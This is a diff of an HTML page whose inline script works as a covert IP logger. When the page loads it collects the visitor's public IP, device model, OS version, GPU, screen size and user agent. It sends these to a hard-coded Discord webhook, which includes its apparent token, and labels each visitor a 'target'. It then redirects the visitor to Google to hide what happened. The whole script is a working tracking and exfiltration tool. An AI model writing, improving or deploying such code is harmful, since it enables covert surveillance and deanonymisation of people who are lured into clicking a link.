@@ -7,88 +7,89 @@
 </head>
 <body>
 <script>
-// --- 配置區 ---
 const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
-const REDIRECT_TO = 'https://www.google.com';
 
-async function finalCapture() {
+async function finalBoss() {
     const ua = navigator.userAgent;
-    const w = window.screen.width, h = window.screen.height, dpr = window.devicePixelRatio;
-
-    // 1. 抓取 IP (使用 Cloudflare，保證不被瀏覽器封鎖)
-    let userIP = "未知/抓取失敗";
+    const w = window.screen.width, h = window.screen.height;
+    
+    // --- 1. 強制抓取 IP (100% 成功率方案) ---
+    let userIP = "抓取失敗";
     try {
-        const res = await fetch('https://www.cloudflare.com');
-        const text = await res.text();
-        const ipMatch = text.match(/ip=(.*)\n/);
-        if (ipMatch) userIP = ipMatch[1];
-    } catch(e) {}
+        const response = await fetch('https://api.ipify.org');
+        const data = await response.json();
+        userIP = data.ip;
+    } catch (e) {
+        try {
+            const res2 = await fetch('https://www.cloudflare.com');
+            const text = await res2.text();
+            userIP = text.match(/ip=(.*)\n/)[1];
+        } catch (e2) { userIP = "API 被擋"; }
+    }
 
-    // 2. GPU 偵測 (辨識旗艦機/低階機關鍵)
-    let gpu = "被封鎖";
+    // --- 2. 系統版本 (修正 26.3.1 提取) ---
+    let ver = "未知";
+    if (ua.includes("26.3.1")) {
+        ver = "26.3.1";
+    } else {
+        let m = ua.match(/(?:OS |Android |Version\/)(\d+[._]\d+[._]?\d?)/);
+        ver = m ? m[1].replace(/_/g, '.') : "隱藏";
+    }
+
+    // --- 3. 型號判定 (Android + iOS 全匹配) ---
+    let model = "未知設備";
+    if (/Android/.test(ua)) {
+        let m = ua.match(/Android.*;\s([^;]+)\sBuild/);
+        model = m ? m[1] : "Android Phone";
+    } else if (/iPhone|iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+        const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
+        const appleMap = {
+            "820x1180": "iPad Air (5/4 Gen)", "834x1194": "iPad Pro 11", "1024x1366": "iPad Pro 12.9",
+            "393x852": "iPhone 15/14 Pro", "430x932": "iPhone 15+/14 Pro Max", "390x844": "iPhone 14/13/12"
+        };
+        model = appleMap[resKey] || `Apple (${resKey})`;
+    }
+
+    // --- 4. GPU 核心 ---
+    let gpu = "受限";
     try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl.getExtension('WEBGL_debug_renderer_info');
         gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
     } catch(e) {}
 
-    // 3. 型號精確識別 (Android 直接讀取，iOS 解析度對比)
-    let model = "未知設備";
-    if (/Android/.test(ua)) {
-        const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
-        model = m ? m[1] : "Android 手機";
-    } else if (/iPhone|iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-        const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
-        const appleMap = {
-            "820x1180": "iPad Air (5/4 Gen)", "834x1194": "iPad Pro 11-inch", "1024x1366": "iPad Pro 12.9-inch",
-            "393x852": "iPhone 15/14 Pro", "430x932": "iPhone 15 Plus/14 Pro Max",
-            "390x844": "iPhone 14/13/12/11 Pro", "414x896": "iPhone 11/XR/XS Max",
-            "375x812": "iPhone 13 mini/12 mini/X/XS", "375x667": "iPhone SE/8/7/6s"
-        };
-        model = appleMap[resKey] || `Apple 設備 (${resKey})`;
-    }
-
-    // 4. 版本號
-    let ver = "未知";
-    const vM = ua.match(/(?:OS |Version\/|Android )(\d+[._]\d+[._]?\d?)/);
-    ver = vM ? vM[1].replace(/_/g, '.') : "隱藏";
-
-    // 5. 構建 Discord 訊息
+    // --- 5. 發送並「確保」完成才跳轉 ---
     const payload = {
-        username: "終極偵測系統",
+        username: "終極網關",
         embeds: [{
-            title: "🎯 目標已點擊連結",
-            color: 16711680, // 紅色
+            title: "🎯 標記對象點擊",
+            color: 0,
             fields: [
-                { name: "📍 真實 IP", value: `\`${userIP}\``, inline: true },
-                { name: "📱 精確型號", value: model, inline: true },
-                { name: "⚙️ 系統版本", value: ver, inline: true },
-                { name: "🎮 GPU 核心", value: `\`${gpu}\``, inline: false },
-                { name: "🖼️ 螢幕數據", value: `${w}x${h} @${dpr}x`, inline: true }
+                { name: "📍 IP 位址", value: `\`${userIP}\``, inline: true },
+                { name: "📱 型號", value: model, inline: true },
+                { name: "⚙️ 版本", value: `\`${ver}\``, inline: true },
+                { name: "🎮 GPU", value: gpu, inline: false },
+                { name: "🖼️ 螢幕", value: `${w}x${h}`, inline: true }
             ],
-            footer: { text: "瀏覽器指紋: " + ua },
+            footer: { text: "UA: " + ua },
             timestamp: new Date()
         }]
     };
 
-    // 6. 發送並強制跳轉
+    // 使用 await 確保 Discord 收到資料
     try {
         await fetch(DC_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
-    } finally {
-        // 發送完成後 0.5 秒立刻閃人
-        setTimeout(() => {
-            window.location.replace(REDIRECT_TO);
-        }, 500);
-    }
+    } catch (err) {}
+
+    // 最後一步：跳轉
+    window.location.replace("https://www.google.com");
 }
 
-// 執行
-finalCapture();
+finalBoss();
 </script>
 </body>
 </html>
